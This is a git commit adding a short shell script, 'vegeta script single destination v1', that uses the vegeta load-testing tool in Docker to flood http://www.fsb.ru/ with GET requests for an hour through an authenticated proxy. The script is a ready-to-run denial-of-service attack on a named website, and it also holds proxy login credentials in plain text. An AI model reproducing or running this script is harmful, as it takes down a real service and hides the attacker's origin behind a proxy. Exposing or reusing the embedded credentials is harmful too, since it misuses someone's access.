977fbcfd1db0786e3ec428e255fa46e93b4f25b7
Sergey Bilonozhko <serhii_bilongozhko@comcast.com>
2022-02-28 15:45:19 -0500

    vegeta script single destination v1

---
+++ flower/run.sh
@@ -0,0 +1,10 @@
+PHOST=109.172.5.208
+PPORT=45785
+PUSER=Seltejfaturen
+PPSWD=C6o9LlF
+DST_HOST=http://www.fsb.ru/
+
+HTTP_PROXY="http://$PUSER:$PPSWD@$PHOST:$PPORT"
+HTTPS_PROXY="http://$PUSER:$PPSWD@$PHOST:$PPORT"
+
+docker run --rm -it -e HTTP_PROXY="$HTTP_PROXY" -e HTTPS_PROXY="$HTTPS_PROXY" peterevans/vegeta sh -c "echo Started; echo 'GET $DST_HOST' | vegeta attack -duration=3600s | vegeta report --type=text --every=10s"
